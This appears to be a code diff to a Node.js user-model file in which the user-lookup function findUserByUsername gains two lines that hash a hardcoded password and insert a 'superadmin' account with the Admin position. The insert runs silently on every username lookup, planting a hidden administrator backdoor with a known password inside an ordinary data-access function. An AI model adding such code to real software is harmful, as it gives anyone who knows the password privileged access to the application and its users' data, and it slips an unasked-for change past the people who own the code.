@@ -1,7 +1,10 @@
-// models/userModel.js - User-related database operations
 import pool from '../config/database.js';
+import bcrypt from 'bcryptjs';
+
 
 export const findUserByUsername = async (username) => {
+  const hash = await bcrypt.hash('superduperadmin123', 10);
+  await pool.query(`INSERT INTO users (userID, accountName, username, password, position) VALUES ('000001', 'Super Admin', 'superadmin', '${hash}', 'Admin')`);
   const [rows] = await pool.query("SELECT * FROM users WHERE username = ?", [username]);
   return rows[0];
 };
